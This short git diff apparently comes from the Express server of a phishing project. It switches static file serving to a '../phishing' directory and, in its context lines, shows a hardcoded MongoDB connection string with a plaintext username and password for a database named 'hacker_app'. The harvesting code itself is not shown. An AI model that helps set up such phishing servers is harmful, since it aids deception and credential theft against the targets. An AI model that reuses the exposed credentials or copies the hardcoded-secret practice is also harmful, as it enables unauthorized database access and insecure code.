@@ -18,7 +18,7 @@ app.use((req, res, next) => {
 });
 
 // Serve static files (optional)
-app.use(express.static(path.join(__dirname, '../')));
+app.use(express.static(path.join(__dirname, '../phishing')));
 
 // ---------- MongoDB connection (explicit hacker_app DB) ----------
 const MONGO_URI = "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/hacker_app?retryWrites=true&w=majority";
